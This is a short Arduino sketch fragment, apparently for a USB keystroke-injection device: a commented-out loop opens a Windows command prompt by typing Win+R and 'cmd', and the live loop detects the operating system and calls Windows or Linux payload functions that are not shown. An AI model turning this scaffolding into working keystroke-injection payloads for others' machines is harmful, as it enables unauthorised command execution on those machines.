

/*void loop()
{
  digitalWrite(ledPin, HIGH);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  Keyboard.print("cmd \n");
  digitalWrite(ledPin, LOW);
  delay(100000);
  }
*/

void loop()
{
  digitalWrite(ledPin, HIGH);
  delay(2000);  // do not print too fast!
  test_os_windows();

  if (test_os_windows()){
    //windows
    payload_windows();
    
  }
  else{
    // linux
    payload_linux();
  }
}
